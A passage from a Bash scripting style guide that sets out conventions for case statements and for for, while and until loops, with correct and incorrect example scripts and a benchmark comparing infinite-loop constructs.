    pid=$(cat "$PID_FILE")
    if kill -0 "$pid" 2>/dev/null; then
      info "$SERVICE_NAME is running (PID: $pid)"
      return 0
    else
      error "$SERVICE_NAME is not running (stale PID file)"
      return 1
    fi
  else
    info "$SERVICE_NAME is not running"
    return 3
  fi
}

reload_service() {
  [[ -f "$PID_FILE" ]] || die 1 'Service not running'

  local -i pid
  pid=$(cat "$PID_FILE")
  info "Reloading $SERVICE_NAME configuration..."
  kill -HUP "$pid"
  success 'Configuration reloaded'
}

main() {
  local -- action=${1:-}

  [[ -n "$action" ]] || die 22 'No action specified (start|stop|restart|status|reload)'

  # Route to appropriate handler
  case "$action" in
    start)
      start_service
      ;;

    stop)
      stop_service
      ;;

    restart)
      restart_service
      ;;

    status)
      status_service
      ;;

    reload)
      reload_service
      ;;

    # Handle common variations
    st|stat)
      status_service
      ;;

    re|rest)
      restart_service
      ;;

    # Reject unknown actions
    *)
      die 22 "Invalid action ${action@Q} (use: start|stop|restart|status|reload)"
      ;;
  esac
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - quoting patterns unnecessarily
case "$value" in
  "start") echo 'Starting...' ;;    # Don't quote literal patterns
  "stop") echo 'Stopping...' ;;
esac

# ✓ Correct - unquoted literal patterns
case "$value" in
  start) echo 'Starting...' ;;
  stop) echo 'Stopping...' ;;
esac

# ✗ Wrong - not quoting the test variable
case $filename in    # Unquoted variable!
  *.txt) process_text ;;
esac

# ✓ Correct - quote the test variable
case "$filename" in
  *.txt) process_text ;;
esac

# ✗ Wrong - using if/elif for simple pattern matching
if [[ "$ext" == 'txt' ]]; then
  process_text
elif [[ "$ext" == 'pdf' ]]; then
  process_pdf
elif [[ "$ext" == 'md' ]]; then
  process_markdown
else
  die 1 'Unknown type'
fi

# ✓ Correct - case is clearer
case "$ext" in
  txt)  process_text ;;
  pdf)  process_pdf ;;
  md)   process_markdown ;;
  *)    die 1 'Unknown type' ;;
esac

# ✗ Wrong - missing default case
case "$action" in
  start) start_service ;;
  stop)  stop_service ;;
esac
# What if $action is 'restart'? Silent failure!

# ✓ Correct - always include default case
case "$action" in
  start)   start_service ;;
  stop)    stop_service ;;
  restart) restart_service ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✗ Wrong - inconsistent format mixing
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift
      OUTPUT=$1
      ;;                 # Inconsistent - mixing compact and expanded
  -h) show_help; exit 0 ;;
esac

# ✓ Correct - consistent compact format
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift; OUTPUT=${1:-} ;;
  -h) show_help; exit 0 ;;
esac

# ✗ Wrong - poor column alignment
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force) FORCE=1 ;;        # Alignment is inconsistent
  -h|--help) show_help; exit 0 ;;
esac

# ✓ Correct - consistent column alignment
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force)   FORCE=1 ;;
  -h|--help)    show_help; exit 0 ;;
esac

# ✗ Wrong - not using ;; terminator
case "$value" in
  start) start_service
  stop) stop_service       # Missing ;;
esac

# ✓ Correct - always use ;; terminator
case "$value" in
  start) start_service ;;
  stop)  stop_service ;;
esac

# ✗ Wrong - fall-through patterns (not supported in Bash)
case "$code" in
  200|201|204)
    success='true'       # Bash doesn't fall through!
  300|301|302)
    redirect='true'      # This won't work as intended
    ;;
esac

# ✓ Correct - explicit pattern grouping
case "$code" in
  200|201|204) success='true' ;;
  300|301|302) redirect='true' ;;
esac

# ✗ Wrong - regex patterns (not supported)
case "$input" in
  [0-9]+) echo 'Number' ;;    # Not regex! This matches single digit only
esac

# ✓ Correct - use proper pattern syntax
case "$input" in
  +([0-9])) echo 'Number' ;;  # Requires extglob
esac
# Or use if with regex:
if [[ "$input" =~ ^[0-9]+$ ]]; then
  echo 'Number'
fi

# ✗ Wrong - side effects in patterns
case "$value" in
  $(complex_function)) echo 'Match' ;;  # Function called for every case!
esac

# ✓ Correct - evaluate once before case
result=$(complex_function)
case "$value" in
  "$result") echo 'Match' ;;
esac

# ✗ Wrong - testing multiple variables
case "$var1" in
  value1) case "$var2" in    # Nested case - hard to read
    value2) action ;;
  esac ;;
esac

# ✓ Correct - use if for multiple variable tests
if [[ "$var1" == value1 && "$var2" == value2 ]]; then
  action
fi
```

**Edge cases and advanced patterns:**

**1. Empty string handling:**

```bash
# Empty string is a valid case
case "$value" in
  '')  echo 'Empty string' ;;
  *)   echo "Value: $value" ;;
esac

# Multiple empty possibilities
case "$input" in
  ''|' '|$'\t')
       echo 'Blank or whitespace' ;;
  *)   echo 'Has content' ;;
esac
```

**2. Special characters in patterns:**

```bash
# Quote patterns with special characters
case "$filename" in
  'file (1).txt')      echo 'Match parentheses' ;;
  'file [backup].txt') echo 'Match brackets' ;;
  'file$special.txt')  echo 'Match dollar sign' ;;
  *)                   echo 'Other' ;;
esac

# Wildcards in middle of pattern
case "$path" in
  /usr/*/bin)         echo 'Binary path under /usr' ;;
  /home/*/Documents)  echo 'User documents folder' ;;
esac
```

**3. Numeric patterns (as strings):**

```bash
# Case treats everything as strings
case "$port" in
  80|443)  echo 'Standard web port' ;;
  22)      echo 'SSH port' ;;
  [0-9][0-9][0-9][0-9])
           echo 'Four-digit port' ;;
  *)       echo 'Other port' ;;
esac

# For numeric comparison, use (()) instead
if ((port == 80 || port == 443)); then
  echo 'Standard web port'
fi
```

**4. Extglob patterns:**

```bash
shopt -s extglob

case "$filename" in
  # Zero or one occurrence
  test?(s).txt)
    echo 'test.txt or tests.txt'
    ;;

  # Zero or more occurrences
  file*(backup).txt)
    echo 'file.txt, filebackup.txt, filebackupbackup.txt'
    ;;

  # One or more occurrences
  log+([0-9]).txt)
    echo 'log1.txt, log123.txt, etc.'
    ;;

  # Exactly one of the patterns
  @(README|LICENSE|CHANGELOG))
    echo 'Standard project file'
    ;;

  # Anything except the patterns
  !(*.tmp|*.bak))
    echo 'Not a temp or backup file'
    ;;

  *)
    echo 'Other file'
    ;;
esac
```

**5. Case statement in functions:**

```bash
# Return different values based on case
validate_input() {
  local -- input=$1

  case "$input" in
    [a-z]*)
      info 'Valid lowercase input'
      return 0
      ;;

    [A-Z]*)
      warn 'Input should be lowercase'
      return 1
      ;;

    [0-9]*)
      error 'Input should not start with digit'
      return 2
      ;;

    '')
      error 'Input is empty'
      return 22
      ;;

    *)
      error 'Invalid input format'
      return 1
      ;;
  esac
}

# Use return value
if validate_input "$user_input"; then
  process_input "$user_input"
fi
```

**6. Multi-level case routing:**

```bash
# First level: action
main() {
  local -- action=$1
  shift

  case "$action" in
    user)
      handle_user_commands "$@"
      ;;

    group)
      handle_group_commands "$@"
      ;;

    system)
      handle_system_commands "$@"
      ;;

    *)
      die 22 "Invalid action ${action@Q}"
      ;;
  esac
}

# Second level: subcommand
handle_user_commands() {
  local -- subcommand=$1
  shift

  case "$subcommand" in
    add)    add_user "$@" ;;
    delete) delete_user "$@" ;;
    list)   list_users ;;
    *)      die 22 "Invalid user subcommand ${subcommand@Q}" ;;
  esac
}

handle_group_commands() {
  local -- subcommand=$1
  shift

  case "$subcommand" in
    add)    add_group "$@" ;;
    delete) delete_group "$@" ;;
    list)   list_groups ;;
    *)      die 22 "Invalid group subcommand ${subcommand@Q}" ;;
  esac
}
```

**Summary:**

- **Use case for pattern matching** - testing single variable against multiple patterns
- **Compact format** - single-line actions with aligned `;;`
- **Expanded format** - multi-line actions with `;;` on separate line
- **Always quote test variable** - `case "$var" in` not `case $var in`
- **Don't quote literal patterns** - `start)` not `"start")`
- **Include default case** - always have `*)` to handle unexpected values
- **Use alternation** - `pattern1|pattern2|pattern3)` for multiple matches
- **Leverage wildcards** - `*.txt)` for glob patterns
- **Enable extglob** - for advanced pattern matching `@(pattern)`, `!(pattern)`
- **Align consistently** - choose compact or expanded, align actions at same column
- **Prefer case over if/elif** - for single-variable multi-value tests
- **Use if for complex logic** - multiple variables, ranges, complex conditions
- **Terminate with ;;** - every case branch needs `;;`

**Key principle:** Case statements excel at routing based on pattern matching of a single value. They're more readable, maintainable, and efficient than long if/elif chains for this purpose. Choose compact format for simple flag setting (argument parsing), expanded format for complex multi-line logic. Always include a default `*)` case to handle unexpected values explicitly. The visual alignment and pattern syntax make case statements self-documenting and easy to modify.


---


**Rule: BCS0503**

## Loops

**Use loops to iterate over collections, process command output, or repeat operations. Bash provides `for`, `while`, and `until` loops, each suited to different iteration patterns. Always prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ proper loop control with `break` and `continue` for early exits and conditional skipping.**

**Rationale:**

- **Collection Processing**: For loops efficiently iterate over arrays, globs, and ranges
- **Stream Processing**: While loops process line-by-line input from commands or files
- **Condition Looping**: While/until loops continue until condition changes
- **Array Safety**: Iterating arrays with `"${array[@]}"` preserves element boundaries
- **Process Substitution**: Using `< <(command)` avoids subshell variable scope issues
- **Loop Control**: Break and continue enable early exit and conditional processing
- **Readability**: Appropriate loop type makes intent immediately clear

**For loops - Array iteration:**

The most common and safest loop pattern in Bash.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Iterate over array elements
process_files() {
  local -a files=(
    document.txt
    'file with spaces.pdf'
    'report (final).doc'
  )

  local -- file
  for file in "${files[@]}"; do
    if [[ -f "$file" ]]; then
      info "Processing ${file@Q}"
      # Process file
    else
      warn "File not found ${file@Q}"
    fi
  done
}

# ✓ CORRECT - Iterate with index and value
process_indexed() {
  local -a items=('alpha' 'beta' 'gamma' 'delta')
  local -i index
  local -- item

  for index in "${!items[@]}"; do
    item="${items[$index]}"
    info "Item $index: $item"
  done
}

# ✓ CORRECT - Iterate over arguments
process_arguments() {
  local -- arg

  for arg in "$@"; do
    info "Argument: $arg"
  done
}

main() {
  process_files
  process_indexed
  process_arguments 'arg1' 'arg with spaces' 'arg3'
}

main "$@"

#fin
```

**For loops - Glob patterns:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Iterate over glob matches
process_text_files() {
  local -- file

  # nullglob ensures empty loop if no matches
  for file in "$SCRIPT_DIR"/*.txt; do
    info "Processing text file ${file@Q}"
    # Process file
  done
}

# ✓ CORRECT - Multiple glob patterns
process_documents() {
  local -- file

  for file in "$SCRIPT_DIR"/*.{txt,md,rst}; do
    if [[ -f "$file" ]]; then
      info "Processing document ${file@Q}"
      # Process file
    fi
  done
}

# ✓ CORRECT - Recursive glob (requires globstar)
process_all_scripts() {
  shopt -s globstar

  local -- script

  for script in "$SCRIPT_DIR"/**/*.sh; do
    if [[ -f "$script" ]]; then
      info "Found script ${script@Q}"
      shellcheck "$script"
    fi
  done
}

# ✓ CORRECT - Check if glob matched anything
process_with_check() {
  local -a matches=("$SCRIPT_DIR"/*.log)

  if [[ ${#matches[@]} -eq 0 ]]; then
    warn 'No log files found'
    return 1
  fi

  local -- file
  for file in "${matches[@]}"; do
    info "Processing log ${file@Q}"
  done
}

main() {
  process_text_files
  process_documents
  process_all_scripts
  process_with_check
}

main "$@"
#fin
```

**For loops - C-style:**

Use for numeric iteration with known range.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - C-style for loop
count_to_ten() {
  local -i i

  for ((i=1; i<=10; i+=1)); do
    echo "Count: $i"
  done
}

# ✓ CORRECT - Iterate with step
count_by_twos() {
  local -i i

  for ((i=0; i<=20; i+=2)); do
    echo "Even: $i"
  done
}

# ✓ CORRECT - Countdown
countdown() {
  local -i seconds=${1:-10}
  local -i i

  for ((i=seconds; i>0; i-=1)); do
    echo "T-minus $i seconds..."
    sleep 1
  done

  echo 'Liftoff!'
}

# ✓ CORRECT - Array processing with index
process_with_index() {
  local -a items=('first' 'second' 'third' 'fourth')
  local -i i

  for ((i=0; i<${#items[@]}; i+=1)); do
    echo "Index $i: ${items[$i]}"
  done
}

main() {
  count_to_ten
  count_by_twos
  countdown 5
  process_with_index
}

main "$@"
#fin
```

**For loops - Brace expansion and sequences:**

```bash
# Range expansion (Bash 4+)
for i in {1..10}; do
  echo "Number: $i"
done

# Range with step (Bash 4+)
for i in {0..100..10}; do
  echo "Multiple of 10: $i"
done

# Character range
for letter in {a..z}; do
  echo "Letter: $letter"
done

# Brace expansion with strings
for env in {dev,staging,prod}; do
  echo "Deploy to: $env"
done

# Zero-padded numbers
for file in file{001..100}.txt; do
  echo "Filename: $file"
done
```

**While loops - Reading input:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Read file line by line
read_file() {
  local -- file=$1
  local -- line
  local -i line_count=0

  while IFS= read -r line; do
    line_count+=1
    echo "Line $line_count: $line"
  done < "$file"

  info "Total lines: $line_count"
}

# ✓ CORRECT - Process command output (avoid subshell)
process_command_output() {
  local -- line
  local -i count=0

  while IFS= read -r line; do
    count+=1
    info "Processing: $line"
  done < <(find "$SCRIPT_DIR" -name '*.txt' -type f)

  info "Processed $count files"
}

# ✓ CORRECT - Read null-delimited input
process_null_delimited() {
  local -- file

  while IFS= read -r -d '' file; do
    info "Processing: $file"
  done < <(find "$SCRIPT_DIR" -name '*.sh' -type f -print0)
}

# ✓ CORRECT - Read CSV with custom delimiter
read_csv() {
  local -- csv_file=$1
  local -- name email age

  while IFS=',' read -r name email age; do
    info "Name: $name, Email: $email, Age: $age"
  done < "$csv_file"
}

# ✓ CORRECT - Read with timeout
read_with_timeout() {
  local -- input

  info 'Enter your name (10 second timeout):'

  if read -r -t 10 input; then
    success "Hello, $input!"
  else
    warn 'Timed out waiting for input'
    return 1
  fi
}

main() {
  local -- test_file='/tmp/test.txt'
  echo -e "Line 1\nLine 2\nLine 3" > "$test_file"

  read_file "$test_file"
  process_command_output
  process_null_delimited

  rm -f "$test_file"
}

main "$@"
#fin
```

**While loops - Argument parsing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- OUTPUT_DIR=''
declare -a INPUT_FILES=()

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ✓ CORRECT - While loop for argument parsing
main() {
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -o|--output)
        noarg "$@"
        shift
        OUTPUT_DIR=$1
        ;;

      -h|--help)
        show_help
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        INPUT_FILES+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments after --
  INPUT_FILES+=("$@")

  readonly -- VERBOSE DRY_RUN OUTPUT_DIR
  readonly -a INPUT_FILES

  # Validate
  ((${#INPUT_FILES[@]})) || die 22 'No input files specified'

  # Process files
  local -- file
  for file in "${INPUT_FILES[@]}"; do
    ((DRY_RUN)) && info "[DRY-RUN] Would process ${file@Q}" ||:
    ((DRY_RUN)) || info "Processing ${file@Q}"
  done
}

main "$@"
#fin
```

**While loops - Condition-based:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Wait for condition
wait_for_file() {
  local -- file=$1
  local -i timeout=${2:-30}
  local -i elapsed=0

  info "Waiting for file ${file@Q}"

  while [[ ! -f "$file" ]]; do
    if ((elapsed >= timeout)); then
      error "Timeout waiting for file ${file@Q}"
      return 1
    fi

    sleep 1
    elapsed+=1
  done

  success "File appeared after $elapsed seconds"
}

# ✓ CORRECT - Retry with exponential backoff
retry_command() {
  local -i max_attempts=5
  local -i attempt=1
  local -i wait_time=1

  while ((attempt <= max_attempts)); do
    info "Attempt $attempt of $max_attempts"

    if some_command; then
      success 'Command succeeded'
      return 0
    fi

    if ((attempt < max_attempts)); then
      warn "Failed, retrying in $wait_time seconds..."
      sleep "$wait_time"
      wait_time=$((wait_time * 2))  # Exponential backoff
    fi

    attempt+=1
  done

  error 'All retry attempts failed'
  return 1
}

# ✓ CORRECT - Process until resource available
process_queue() {
  local -i max_items=100
  local -i processed=0

  while ((processed < max_items)); do
    if ! get_next_item; then
      info 'Queue empty'
      break
    fi

    process_item
    processed+=1
  done

  info "Processed $processed items"
}

main() {
  wait_for_file '/tmp/ready.txt' 10
  retry_command
  process_queue
}

main "$@"
#fin
```

**Until loops:**

Until loops are less common but useful when the logic reads better as "until condition becomes true."

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Until loop (opposite of while)
wait_for_service() {
  local -- service=$1
  local -i timeout=${2:-60}
  local -i elapsed=0

  info "Waiting for service: $service"

  # Loop UNTIL service is running
  until systemctl is-active --quiet "$service"; do
    if ((elapsed >= timeout)); then
      error "Timeout waiting for service: $service"
      return 1
    fi

    sleep 1
    elapsed+=1
  done

  success "Service started after $elapsed seconds"
}

# ✓ CORRECT - Until condition met
wait_until_ready() {
  local -- status_file=$1
  local -i max_wait=30
  local -i waited=0

  until [[ -f "$status_file" && "$(cat "$status_file")" == 'READY' ]]; do
    if ((waited >= max_wait)); then
      error 'Timeout waiting for ready status'
      return 1
    fi

    sleep 1
    waited+=1
  done

  info 'System ready'
}

# ✗ Generally avoid - while is usually clearer
# This until loop is confusing:
until [[ ! -f "$lock_file" ]]; do
  sleep 1
done

# ✓ Better - equivalent while loop is clearer:
while [[ -f "$lock_file" ]]; do
  sleep 1
done

main() {
  wait_for_service 'nginx' 30
  wait_until_ready '/tmp/status.txt'
}

main "$@"
#fin
```

**Loop control - break and continue:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Early exit with break
find_first_match() {
  local -- pattern=$1
  local -a files=("$SCRIPT_DIR"/*)
  local -- file
  local -- found=''

  for file in "${files[@]}"; do
    if [[ -f "$file" && "$file" =~ $pattern ]]; then
      found="$file"
      info "Found match: $file"
      break  # Stop searching after first match
    fi
  done

  [[ -n "$found" ]] || return 1

  echo "$found"
  return 0
}

# ✓ CORRECT - Skip items with continue
process_valid_files() {
  local -a files=("$@")
  local -- file
  local -i processed=0
  local -i skipped=0

  for file in "${files[@]}"; do
    # Skip non-existent files
    if [[ ! -f "$file" ]]; then
      warn "File not found ${file@Q}"
      skipped+=1
      continue
    fi

    # Skip files we can't read
    if [[ ! -r "$file" ]]; then
      warn "File not readable ${file@Q}"
      skipped+=1
      continue
    fi

    # Skip empty files
    if [[ ! -s "$file" ]]; then
      warn "File is empty ${file@Q}"
      skipped+=1
      continue
    fi

    # Process file
    info "Processing ${file@Q}"
    # ... processing logic ...
    processed+=1
  done

  info "Processed: $processed, Skipped: $skipped"
}

# ✓ CORRECT - Break out of nested loops
find_in_matrix() {
  local -a matrix=(
    'row1col1 row1col2 row1col3'
    'row2col1 row2col2 row2col3'
    'row3col1 target row3col3'
  )

  local -- row col
  local -i found=0

  for row in "${matrix[@]}"; do
    for col in $row; do
      if [[ "$col" == 'target' ]]; then
        info "Found target in row: $row"
        found=1
        break 2  # Break out of both loops
      fi
    done
  done

  ((found))
}

# ✓ CORRECT - Continue in while loop
process_log_file() {
  local -- log_file=$1
  local -- line
  local -i errors=0

  while IFS= read -r line; do
    # Skip empty lines
    [[ -n "$line" ]] || continue
    # Skip comments
    [[ ! "$line" =~ ^# ]] || continue

    # Process error lines
    if [[ "$line" =~ ERROR ]]; then
      error "Error found ${line@Q}"
      errors+=1
    fi
  done < "$log_file"

  info "Found $errors errors"
  return "$errors"
}

main() {
  find_first_match 'test'
  process_valid_files file1.txt file2.txt file3.txt
  find_in_matrix
  process_log_file '/var/log/app.log'
}

main "$@"
#fin
```

**Infinite loops:**

> **Performance Note:** Benchmark testing (Bash 5.2.21, 13th Gen Intel i9-13900HX) demonstrates significant performance differences between infinite loop constructs:
>
> | Construct | 100K iterations | 1M iterations | 5M iterations | 1M with work | Performance |
> |-----------|----------------|---------------|---------------|--------------|-------------|
> | `while ((1))` | 0.091s | 0.885s | 4.270s | 1.432s | **Baseline (fastest)** ⚡ |
> | `while :` | 0.102s | 1.009s | 4.837s | 1.575s | +9-14% slower |
> | `while true` | 0.110s | 1.079s | 5.231s | 1.647s | **+15-22% slower** 🐌 |
>
> **Recommendation:** Use `while ((1))` for optimal performance. Use `while :` for POSIX compatibility. Avoid `while true` due to command execution overhead.
>
> See `/ai/scripts/bcx/docs/BENCHMARK-RESULTS.md` for complete analysis.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ RECOMMENDED - Infinite loop with break condition (fastest option)
monitor_service() {
  local -- service=$1
  local -i interval=${2:-5}

  info "Monitoring service: $service (interval: ${interval}s)"

  while ((1)); do
    if ! systemctl is-active --quiet "$service"; then
      error "Service $service is down!"
      # Could send alert here
    else
      info "Service $service is running"
    fi

    sleep "$interval"
  done
}

# ✓ RECOMMENDED - Infinite loop with exit condition
daemon_loop() {
  local -- pid_file=/var/run/daemon.pid

  # Create PID file
  echo "$$" > "$pid_file"

  # Cleanup on exit
  trap 'rm -f "$pid_file"' EXIT

  info 'Daemon started'

  while ((1)); do
    # Check if we should stop
    if [[ ! -f "$pid_file" ]]; then
      info 'PID file removed, stopping daemon'
      break
    fi

    # Do work
    process_queue

    # Sleep between iterations
    sleep 1
  done

  info 'Daemon stopped'
}

# ✓ RECOMMENDED - Interactive loop
interactive_menu() {
  local -- choice

  while ((1)); do
    echo ''
    echo 'Menu:'
    echo '  1) Start service'
    echo '  2) Stop service'
    echo '  3) Check status'
    echo '  q) Quit'
    echo ''
    read -r -p 'Choice: ' choice

    case "$choice" in
      1)    start_service ;;
      2)    stop_service ;;
      3)    check_status ;;
      q|Q)  info 'Goodbye!'; break ;;
      *)    warn "Invalid choice ${choice@Q}" ;;
    esac
  done
}

# ✓ ACCEPTABLE - POSIX-compatible infinite loop (for /bin/sh scripts)
posix_daemon() {
  # Use while : when POSIX compatibility is required
  while :; do
    process_item || break
    sleep 1
  done
}

# ✗ AVOID - Slowest option due to command execution overhead
slow_monitor() {
  while true; do  # Not recommended: 15-22% slower than while ((1))
    check_status
    sleep 5
  done
}

main() {
  # monitor_service 'nginx' 10  # Would run forever
  # daemon_loop  # Would run forever
  interactive_menu
}

main "$@"
#fin
```

**Nested loops:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Process matrix data
process_matrix() {
  local -a rows=('row1' 'row2' 'row3')
  local -a cols=('col1' 'col2' 'col3')
  local -- row col

  for row in "${rows[@]}"; do
    for col in "${cols[@]}"; do
      echo "Processing: $row, $col"
    done
  done
}

# ✓ CORRECT - Cross-product iteration
test_combinations() {
  local -a environments=('dev' 'staging' 'prod')
  local -a regions=('us-east' 'us-west' 'eu-west')
  local -- env region

  for env in "${environments[@]}"; do
    for region in "${regions[@]}"; do
      info "Testing: $env in $region"
      # Run tests
    done
  done
}

# ✓ CORRECT - Process directory tree
process_tree() {
  local -- base_dir=$1
  local -a dirs=("$base_dir"/*)
  local -- dir file

  for dir in "${dirs[@]}"; do
    [[ -d "$dir" ]] || continue

    info "Processing directory ${dir@Q}"

    for file in "$dir"/*; do
      if [[ -f "$file" ]]; then
        info "  Processing file ${file@Q}"
      fi
    done
  done
}

main() {
  process_matrix
  test_combinations
  process_tree "$SCRIPT_DIR"
}

main "$@"
#fin
```

**Complete example - File processor with multiple loop types:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i MAX_RETRIES=3
declare -- OUTPUT_DIR=''
declare -a INPUT_PATTERNS=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  (($# > 1)) && [[ "${2:0:1}" != '-' ]] || die 22 "Option ${1@Q} requires an argument"
}

# Retry command with backoff
retry_with_backoff() {
  local -i attempt=1
  local -i wait_time=1

  while ((attempt <= MAX_RETRIES)); do
    ((VERBOSE)) && info "Attempt $attempt of $MAX_RETRIES" ||:

    if "$@"; then
      return 0
    fi

    if ((attempt < MAX_RETRIES)); then
      warn "Failed, retrying in $wait_time seconds..."
      sleep "$wait_time"
      wait_time=$((wait_time * 2))
    fi

    attempt+=1
  done

  error "All $MAX_RETRIES attempts failed"
  return 1
}

# ============================================================================
# Business Logic
# ============================================================================

# Process single file with retry logic
process_file() {
  local -- file=$1

  # Validate file
  if [[ ! -f "$file" ]]; then
    error "File not found ${file@Q}"
    return 2
  fi

  if [[ ! -r "$file" ]]; then
    error "File not readable ${file@Q}"
    return 1
  fi

  if [[ ! -s "$file" ]]; then
    warn "File is empty ${file@Q}"
    return 0
  fi

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would process: $file"
    return 0
  fi

  info "Processing: $file"

  # Process file line by line
  local -- line
  local -i line_count=0

  while IFS= read -r line; do
    # Skip empty lines
    [[ -n "$line" ]] || continue

    # Skip comments
    [[ ! "$line" =~ ^# ]] || continue

    line_count+=1
    ((VERBOSE)) && info "  Line $line_count: $line" || :

    # Process line (with retry)
    retry_with_backoff process_line "$line" || {
      error "Failed to process line $line_count in ${file@Q}"
      return 1
    }
  done < "$file"

  success "Processed $line_count lines from ${file@Q}"
  return 0
}

process_line() {
  local -- line=$1
  # Line processing logic here
  sleep 0.1  # Simulate work
}

# Collect files matching patterns
collect_files() {
  local -a files=()
  local -- pattern file

  # Iterate over each pattern
  for pattern in "${INPUT_PATTERNS[@]}"; do
    ((VERBOSE)) && info "Searching for pattern: $pattern" ||:

    # Iterate over glob matches
    for file in $pattern; do
      # Check if glob matched anything
      if [[ ! -e "$file" ]]; then
        ((VERBOSE)) && warn "No matches for pattern: $pattern" ||:
        continue
      fi

      if [[ -f "$file" ]]; then
        files+=("$file")
      fi
    done
  done

  # Check if we found any files
  if ((${#files[@]} == 0)); then
    error 'No files found matching patterns'
    return 1
  fi

  # Return files (print to stdout)
  printf '%s\n' "${files[@]}"
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments with while loop
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -r|--retries)
        noarg "$@"
        shift
        MAX_RETRIES=$1
        ;;

      -o|--output)
        noarg "$@"
        shift
        OUTPUT_DIR=$1
        ;;

      -h|--help)
